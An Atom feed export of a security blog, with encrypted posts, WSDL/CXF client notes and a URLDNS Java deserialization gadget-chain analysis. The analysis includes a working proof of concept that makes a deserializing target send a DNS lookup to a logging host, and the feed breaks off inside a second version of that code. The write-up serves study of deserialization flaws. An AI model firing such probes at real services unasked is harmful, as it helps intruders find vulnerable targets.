<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>H4ckbird&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/51a9f82d05f49451e3509af2b4abe068</icon>
  <subtitle>欲速则不达</subtitle>
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2022-11-21T12:12:23.000Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>H4ckbird</name>
    <email>stupidbird6379@gmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Test-topBanner&amp;&amp;参数释义</title>
    <link href="http://example.com/2022/11/21/Test-topBanner/"/>
    <id>http://example.com/2022/11/21/Test-topBanner/</id>
    <published>2022-11-21T02:02:52.000Z</published>
    <updated>2022-11-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="deb1bcb7f4783a6c3e9720238cf8cc98b6145a0fb1c438db1158f4300aeef5cf">2b3406d62b6174fb947463ad5f2bb2d06e57c7d91e707796abde320f4893dbc6ecbb4fc0e40fc88c7e3ac29f11bdabfbd7f7a6079a295e4f59ca91061a72c912b082bbb978746b458dabd2ae09d1b9607c30b06eb5fa6a0d770955f76b4de060247ebf9c6b70619631a88284348e2355ee58cc0995f7aba3ccedd8722f166d2189ec7f10362f3583a6b81bcfdcb4cdcbdefc043e4976fb6528a34ba3d5072c6fbe452df3c4b61ade722da2eb6fa73e3ae1b1d35c8b975ac52254704cf8dd641a8a30e703b445eea31222d1d80f0a63c4e9c6909b28efdce76765e55bc572d509e5d57cfd6ca7251233fbe757ff7cf9189a88018e0361ced56c37a6392d1979678d4f5ca089e303c08b587a543fcde7afa67f11a4bd6d001252fe1bd7fcf975c7f5599f691bd2e7b6d33ea1203b6a8a2eebcd2298eff6a2d984666f959a86431a9e6d86d94abdd8d4f86982ee87821be27d0e0b055ccc10c94061bc0e96baf0d76ae5e6483008d3c52fd7037d8e626f446087710672a3175d9cf4e33bf161479372cf772f05b4b90f93ca00d3c70240d5568e0cc66eb11e7bd8fa66f1f176b074724235671dadf855f1a8aab0b96d173cbe0578f3244805a12d1625cd1765af5b4a5a0d39fa080c4f10c2ad2299b264ca5fe6ef74db1e3605b63509cef9348f7b13e7fd744545137af7241d73eebc88d50bdae7c5e3b10fbbc8b8bb5b42a4a6af1b4081a28bdccddcde4a1d79d1c5b87bd5d265ea04ab918cee90f6172ef7e20cd155fd13c6297d78ea645dbc4818ef27ae56d8ca23e34a3d7969f734a31d842ef5d176092e099f8b1b9052826f174d10ecd9afe1f866621ace834d7aae99a9ab6a65a3eb989911be3ef771c655d8f15e4bf214d36e963500bb03f2d88b8740a1cf97b9c5826198be5fce5dbb161d70be85a8fe780730d4619dd9a92e91cd52b10f1164ce80bd132a99e07346bf7753dd4519910476bba72de8e5593cd6f3244f425cc2be03dec67c0e6f379cbfdaddbbdb3a0a034e9d28739b5ef9310ddfe4d9a8aacc53b35bef8704d0c6463825fd6952d9e55df84dc6c6e8879f39a52bb8d43bad8c0ea44182c3f5d87e75f549236feb87ce6b71b63ae95c6d295cdd0bfe69f710b61adce4991ecf4ff6dafb741986a0b51c8937282ed445375e5806b260b1174c6bdf9a318f56f53c26f30be56a918a7a23f6a9a384720c9b15ccdad9e2876cebdda68988cde24bc846b94d0f12b2aa7e9ace3a12e7ac4e9003eb11ccf599e91aa72db3596ef971c9d3eeae12681c8b0236b27e29eac67b1a438a900277e2c2e5d832098a5bd1e0d53ccc48682acffccf8a05b6cb04a032c871d00a596067d0399028ae218a3987def12909c8f03f6deea53ccf4513fffadd43a80e8f7f55956f29e131dc51c4821fbb842e1a9bba6bb4121dc986b49cfb8f5c64d97590cad29f179005ed947fa4bdb9d9fff0071e7324d3e983e64469ac6f2a0ce06a35e1b9c1606e595118081186e0dd77be1649734ecfaf6486d200c937a4f2313fef859d9a53399c796e170b15d38ac5f160270e5779326169738e560cfc7c2ba0aa5a284e0a65ba3c5a2c28032d91e7745e97b72d40d5c5eed6c254426fd668224e95c3d0a6c8efda0a778e9bee5bc2266aac2b48ea2a6572d2e48e0210c1f631ebe53fc3ce285fbdb5a821436abc58b176548cd582a68f2dc58f4b26f408102d896db46ce04f13452cdf3536b25eb7abf84557877559e26f2d8b4e7e709fa779c54302f34cb3ed622797c87997d2ad806d6f12f7745c5843c06f11af7310a0df494db326ed8b2a05d4b8218b89b32c57272d19f14b3eb00d3e8a890673d52754c7c049c9a6b81be2879a6d5a815c3b1c7e8fbc0bb3d24f1ea3d380cc521cb55a647fdf4eb6886346d97c53fd7af2df534614df57f10d37e8181bbdbea7d1849f6c79826164b8bb110d912f694eac197f0d0cbc72c0e4181f822fafd8d4a5e70532ab7723b4f6182f36f965ecace14a140e2235ccf5a35084b589afb34e53088684d7295bd0b4b5f87881a3acd9ab3346584007d83e7be04af624c4ffb970fd0e5600e4f53556139f5867312d888ee6da56183d52d5511b6c643d813a0c5865afc69e05baccce5b67da980eda1d62d460c9067ff0f4d534e598bd13b6e31965dee9669eaa911592622ea5de69740cf368b6d08cc7da4ca49d8aafc7e58b3960035c8d7b91983031046980ee1a243f652eecc025f76c4cd091bda328a2e2a26b45c231b7635e3f988003dad898272451142a76e38f4c631db116630a3c84eb9b80a82c7be65bc4d5d73c0613470757f8684dc33d326fe00ac59608f01351e3a3494743c6db962d57d5079ec881915fc03c19d70c560bc218524c823337282ede507d91b59674311d144a18493a49d709490ec76545f5c3ab6cc99411b05611ab37cfe25db4621a36655ea8164c80eaa9909ad4dc4820a1dbfbd670dbcb3ca97edfe08d038ce17c1edd582e3d298d0023b9fd58120de62fc719142fe396db0bf618b16fb096d727d8197d702181285e81a366ffb01f31dbb3a89e53e5386bd046447a6df11e06b2b9f3be166f05041292d924c1df57e1bd66833ffe10aa88ea1ec51cf91a419cce96296d9525905e1845e74ad818efe9d03e39e4efec45ff1d1e7c04c069117b80fdc49ba29bf3d561cbbe374876535e83961dc7252639d119774ce380043cf69c56461ccc66c856f7b20aebc9e29bee16d4790342443de48bec54701d04788194c0f3e4bc6c32536ffd8596e5d3619eaa76c0a55ac4fc34b82484a5b14a03364829a2c909972910f8a1c463ed9c148d8141f3e3e46f4d0d48fee31bc8682845781c66a70788ae817b7084cbb37d004774438e13542d4c9acf40c4cfe4e8d1b2e950d915119ce3391bf6fce32de053de358fbb12eae17ae51f8ef067f2</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">置顶轮番图测试及参数详情解释</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Test-swiper-index</title>
    <link href="http://example.com/2022/11/21/Test-swiper-index/"/>
    <id>http://example.com/2022/11/21/Test-swiper-index/</id>
    <published>2022-11-21T01:22:01.000Z</published>
    <updated>2022-11-21T01:30:26.980Z</updated>
    
    <content type="html"><![CDATA[<h1 id="测试swiper——index"><a href="#测试swiper——index" class="headerlink" title="测试swiper——index"></a>测试swiper——index</h1><h2 id="How-to-discover-your-authentic-self-—-at-any-age"><a href="#How-to-discover-your-authentic-self-—-at-any-age" class="headerlink" title="How to discover your authentic self — at any age"></a>How to discover your authentic self — at any age</h2><p>After more than two decades as an anchor for ABC News, an on-air panic attack sent Dan Harris’s life in a new direction: he became a dedicated meditator and, to some, even a guru. But then an anonymous survey of his family, friends and colleagues turned up some brutal feedback — he was still kind of a jerk. In a wise, funny talk, he shares his years-long quest to improve his relationships with everyone (starting with himself) and explains the science behind loving-kindness medita…</p><h2 id="How-to-break-down-barriers-and-not-accept-limits"><a href="#How-to-break-down-barriers-and-not-accept-limits" class="headerlink" title="How to break down barriers and not accept limits"></a>How to break down barriers and not accept limits</h2><ul><li>firest : I don’t know</li><li>second: You know what i’m saying? damnit!</li></ul>]]></content>
    
    
    <summary type="html">测试一下置顶的美化效果</summary>
    
    
    
    
    <category term="Butterfly主题美化" scheme="http://example.com/tags/Butterfly%E4%B8%BB%E9%A2%98%E7%BE%8E%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Java文件系统</title>
    <link href="http://example.com/2022/11/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/"/>
    <id>http://example.com/2022/11/19/Java%E6%96%87%E4%BB%B6%E7%B3%BB%E7%BB%9F/</id>
    <published>2022-11-19T13:16:05.000Z</published>
    <updated>2022-11-20T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="5952d9fc47fd342914c4eee762bf8f3125c137f307a1fd3d5a07b573eac03e86"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Java文件系统</summary>
    
    
    
    
    <category term="test image" scheme="http://example.com/tags/test-image/"/>
    
  </entry>
  
  <entry>
    <title>first-page</title>
    <link href="http://example.com/2022/11/19/first-page/"/>
    <id>http://example.com/2022/11/19/first-page/</id>
    <published>2022-11-19T13:16:05.000Z</published>
    <updated>2022-11-21T12:12:23.000Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="64d4ff5441eeeaedad0c7bdaef13cff2576367ee5c279c0893827ea455cdb755"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">测试加密，这里的密码是：测试</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">fist-page肯定是测试用的啦，第一次都是他的。</summary>
    
    
    
    
    <category term="test image" scheme="http://example.com/tags/test-image/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/yso%E6%90%AD%E5%BB%BA/"/>
    <id>http://example.com/2022/11/19/yso%E6%90%AD%E5%BB%BA/</id>
    <published>2022-11-19T12:08:38.025Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<p>参考：</p><p><a href="https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/">https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysoserial-java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86%E6%9C%BA%E5%88%B6/</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;参考：&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.guildhab.top/2020/07/java-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E5-%E8%A7%A3%E5%AF%86-ysos</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/wsdl/"/>
    <id>http://example.com/2022/11/19/wsdl/</id>
    <published>2022-11-19T12:08:38.018Z</published>
    <updated>2022-11-09T05:18:21.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="wsdl-相关"><a href="#wsdl-相关" class="headerlink" title="wsdl 相关"></a>wsdl 相关</h1><h2 id="恢复成java代码"><a href="#恢复成java代码" class="headerlink" title="恢复成java代码"></a>恢复成java代码</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">wsimport -keep &quot;test.wsdl&quot; -p com.test -extension</span><br><span class="line"></span><br><span class="line">常用参数为:</span><br><span class="line">-d&lt;目录&gt;  - 将生成.class文件。默认参数。</span><br><span class="line">-s&lt;目录&gt; - 将生成.java文件。</span><br><span class="line">-p&lt;生成的新包名&gt; -将生成的类，放于指定的包下，自定义包结构。</span><br><span class="line">(wsdlurl) - http://server:port/service?wsdl，必须的参数。</span><br><span class="line">示例：</span><br><span class="line">C:/&gt; wsimport –s .</span><br><span class="line">C:/&gt; wsimport –s . –p com.sitech.web</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">注意：-s不能分开，-s后面有个小点，用于指定源代码生成的目录。点即当前目录。</span><br><span class="line">如果使用了-s参数则会在目录下生成两份代码，一份为.class代码。一份为.java代码。</span><br><span class="line">.class代码，可以经过打包以后使用。.java代码可以直接Copy到我们的项目中运行。</span><br></pre></td></tr></table></figure><h2 id="客户端调用"><a href="#客户端调用" class="headerlink" title="客户端调用"></a>客户端调用</h2><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-frontend-jaxws<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.cxf<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>cxf-rt-transports-http<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.4.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>java代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> org.apache.cxf.endpoint.Client;</span><br><span class="line"><span class="keyword">import</span> org.apache.cxf.jaxws.endpoint.dynamic.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> *https://www.programcreek.com/java-api-examples/?api=org.apache.cxf.jaxws.endpoint.dynamic.JaxWsDynamicClientFactory</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">JaxWsDynamicClientFactory</span> <span class="variable">factory</span> <span class="operator">=</span> JaxWsDynamicClientFactory.newInstance();</span><br><span class="line">        <span class="type">Client</span> <span class="variable">client</span> <span class="operator">=</span> factory.createClient(<span class="string">&quot;http://1.116.136.120:58081/admin/service/UserService?wsdl&quot;</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Object[] objects = client.invoke(<span class="string">&quot;sayHello&quot;</span>,<span class="string">&quot;admin&quot;</span>);</span><br><span class="line">            Arrays.stream(objects).forEach(System.out::println);</span><br><span class="line">            client.destroy();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://blog.51cto.com/u_15127638/2751110">https://blog.51cto.com/u_15127638/2751110</a><br><a href="https://blog.csdn.net/qq_32447301/article/details/79204311">https://blog.csdn.net/qq_32447301/article/details/79204311</a><br><a href="http://www.360doc.com/content/17/0105/20/835902_620335609.shtml">http://www.360doc.com/content/17/0105/20/835902_620335609.shtml</a></p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;wsdl-相关&quot;&gt;&lt;a href=&quot;#wsdl-相关&quot; class=&quot;headerlink&quot; title=&quot;wsdl 相关&quot;&gt;&lt;/a&gt;wsdl 相关&lt;/h1&gt;&lt;h2 id=&quot;恢复成java代码&quot;&gt;&lt;a href=&quot;#恢复成java代码&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2022/11/19/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/"/>
    <id>http://example.com/2022/11/19/URLDNS%E5%88%A9%E7%94%A8%E9%93%BE/</id>
    <published>2022-11-19T12:08:38.009Z</published>
    <updated>2022-11-04T08:59:46.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="URLDNS利用链分析"><a href="#URLDNS利用链分析" class="headerlink" title="URLDNS利用链分析"></a>URLDNS利用链分析</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p><code>URLDNS</code>是相对于其他利用链较为简单的一条<code>gadget</code>利用链，由于<code>URLDNS</code>不依赖与其他第三方库，且不限制<code>jdk</code>版本，所以常常用来检测程序是否存在反序列化漏洞。</p><p><code>URLDNS</code>的特点：只能发送<code>DNS</code>请求，不能执行其他任何命令。</p><h2 id="利用链分析"><a href="#利用链分析" class="headerlink" title="利用链分析"></a>利用链分析</h2><p>问题出在<code>HashMap</code>的<code>readObject()</code>方法中，我们看一下源码，在最后传进的<code>putVal()</code>方法中对<code>key</code>进行了<code>hash()</code>计算<br><img src="images/image-20220918225012617.png" alt="image-20220918225012617"></p><p>跟进<code>hash()</code>方法，接着会调用传进来的<code>key</code>的<code>hashCode()</code>的方法<br><img src="images/image-20220918231235822.png" alt="image-20220918231235822"></p><p>因为我们传进来的<code>key</code>是<code>URL</code>对象，因此接着跟进<code>URL</code>类的<code>hashCode()</code>方法，这里对<code>hackCode</code>参数的值进行了判断，需要满足等于<code>-1</code>的条件<br><img src="images/image-20220918231432956.png" alt="image-20220918231432956"></p><p>继续跟进<code>hashCode = handler.hashCode(this);</code>中的<code>hashCode()</code>方法，该方法里面调用了<code>getHostAddress()</code>方法<br><img src="images/image-20220918231623683.png" alt="image-20220918231623683"></p><p>继续跟进<code>getHostAddress()</code>方法，发现调用了<code>InetAddress.getByName(host);</code>方法<br><img src="images/image-20220918231719742.png" alt="image-20220918231719742"></p><p><code>InetAddress.getByName(host)</code>：只需要传入目标主机的名字，<code>InetAddress</code>会尝试做连接DNS服务器，并且获取IP地址的操作。</p><p>因此在此处发起了一次<code>DNS</code>请求，总结<code>URLDNS</code>利用链如下：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">HashMap --&gt; readObject()</span><br><span class="line">HashMap --&gt; putVal()</span><br><span class="line">HashMap --&gt; hash()</span><br><span class="line">URL     --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; hashCode()</span><br><span class="line">URLStreamHandler --&gt; getHostAddress()</span><br><span class="line">InetAddress      --&gt; InetAddress.getByName()</span><br></pre></td></tr></table></figure></p><p>构造 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span class="string">&quot;http://c62a1767.dns.1433.eu.org&quot;</span>);</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">hashCode</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        hashCode.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        map.put(url, <span class="string">&quot;dotast&quot;</span>);</span><br><span class="line">        hashCode.set(url, -<span class="number">1</span>);</span><br><span class="line">        <span class="type">FileOutputStream</span> <span class="variable">fileOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">out</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(fileOutputStream);</span><br><span class="line">        out.writeObject(map);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">unserialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.txt&quot;</span>);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(fileInputStream);</span><br><span class="line">        in.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>成功发送了 DNS 请求<br><img src="images/image-20220918232949145.png" alt="image-20220918232949145"></p><h2 id="为什么发送了两次请求？"><a href="#为什么发送了两次请求？" class="headerlink" title="为什么发送了两次请求？"></a>为什么发送了两次请求？</h2><p>可以看到上图中的结果显示一共发送了两次请求，调试后发现<code>HashMap.put()</code>方法也会调用一次<code>putVal()</code>方法<br><img src="images/image-20220918233144243.png" alt="image-20220918233144243"></p><p>为了规避实际环境中产生误判的情况，我们需要消除掉这一次多余的<code>DNS</code>请求。</p><p>我们在<code>put()</code>方法前先设置<code>hashCode</code>字段值不为<code>-1</code>就可以不进入<code>hashCode = handler.hashCode(this);</code>语句里，就可避免发送<code>DNS</code>请求。</p><p>最终 POC 如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.serialize;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/9/18 22:43</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">URLDNS</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">URLDNS</span> <span class="variable">urldns</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URLDNS</span>();</span><br><span class="line">        urldns.serialize();</span><br><span class="line">        urldns.unserialize();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">serialize</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">HashMap</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">URL</span> <span class="variable">url</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URL</span>(<span 